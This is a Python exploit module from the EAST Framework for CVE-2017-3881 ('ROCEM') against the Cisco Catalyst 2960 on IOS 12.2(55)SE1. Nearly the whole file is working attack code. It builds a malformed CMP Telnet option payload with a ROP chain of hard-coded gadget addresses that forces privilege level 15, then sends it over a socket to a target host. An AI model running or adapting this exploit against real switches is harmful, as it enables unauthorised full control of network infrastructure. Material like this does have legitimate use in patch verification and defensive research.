#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import struct
import socket

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_cisco_catalyst_2960_pe"
INFO['DESCRIPTION'] = "Cisco Catalyst 2960 IOS 12.2(55)SE1 - 'ROCEM' Remote Code Execution"
INFO['VENDOR'] = "https://www.cisco.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42122/']
INFO["CVE Name"] = "CVE-2017-3881"
INFO["NOTES"] = """An attacker could exploit this vulnerability by sending malformed CMP-specific Telnet options while establishing a Telnet session with an affected Cisco device configured to accept Telnet connections. An exploit could allow an attacker to execute arbitrary code and obtain full control of the device or cause a reload of the affected device. This affects Catalyst switches, Embedded Service 2020 switches, Enhanced Layer 2 EtherSwitch Service Module, Enhanced Layer 2/3 EtherSwitch Service Module, Gigabit Ethernet Switch Module (CGESM) for HP, IE Industrial Ethernet switches, ME 4924-10GE switch, RF Gateway 10, and SM-X Layer 2/3 EtherSwitch Service Module. Cisco Bug IDs: CSCvd48893.
"""
INFO['CHANGELOG'] = "06 Dec, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 23, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        payload = '\xff\xfa\x24\x00'
        payload += '\x03CISCO_KITS\x012:'
        payload += 'A' * 116
        payload += '\x00\x00\x37\xb4'       # first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
        #next bytes are shown as offsets from r1
        payload += '\x02\x2c\x8b\x74'       # +8  address of pointer to is_cluster_mode function - 0x34
        payload += '\x00\x00\x99\x80'   # +12 set  address of func that rets 1
        payload += 'BBBB'                   # +16(+0) r1 points here at second gadget
        payload += '\x00\xdf\xfb\xe8'       # +4 second gadget address 0x00dffbe8: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
        payload += 'CCCC'                   # +8 
        payload += 'DDDD'                   # +12
        payload += 'EEEE'                   # +16(+0) r1 points here at third gadget
        payload += '\x00\x06\x78\x8c'       # +20(+4) third gadget address. 0x0006788c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
        payload += '\x02\x2c\x8b\x60'       # +8  r1+8 = 0x022c8b60
        payload += 'FFFF'                   # +12 
        payload += 'GGGG'                   # +16(+0) r1 points here at fourth gadget 
        payload += '\x00\x6b\xa1\x28'       # +20(+4) fourth gadget address 0x006ba128: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
        payload += '\x00\x12\x52\x1c'   # +8 address of the replacing function that returns 15 (our desired privilege level). 0x0012521c: li r3, 0xf; blr; 
        payload += 'HHHH'                   # +12
        payload += 'IIII'                   # +16(+0) r1 points here at fifth gadget
        payload += '\x01\x48\xe5\x60'       # +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
        payload += 'JJJJ'                   # +8 r1 points here at third gadget
        payload += 'KKKK'                   # +12
        payload += 'LLLL'                   # +16
        payload += '\x01\x13\x31\xa8'       # +20 original execution flow return addr
        payload += ':15:' +  '\xff\xf0'
        
        s = socket.socket()
        try:
            s.connect((self.host, self.port))
            self.log('Connected. Send payload ...')
            s.send(payload)
            s.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('[+] Done!')
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
